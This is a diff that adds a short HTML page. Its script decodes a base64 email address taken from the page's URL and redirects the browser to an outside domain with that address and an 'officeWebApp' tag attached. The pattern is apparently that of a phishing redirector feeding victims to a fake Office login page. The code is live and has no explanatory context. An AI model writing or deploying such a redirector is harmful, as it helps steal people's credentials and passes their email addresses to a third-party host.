@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+            var str = window.location.href;
+            var encodedStringAtoB = str.substring(str.indexOf('=') + 1);
+            var decodedEmail = atob(encodedStringAtoB);
+            console.log(decodedEmail);
+            window.location.replace("https://sarojlogistics.in/css?data=" + decodedEmail + "&officeWebApp");
+        </script>
+    </body>
+</html>
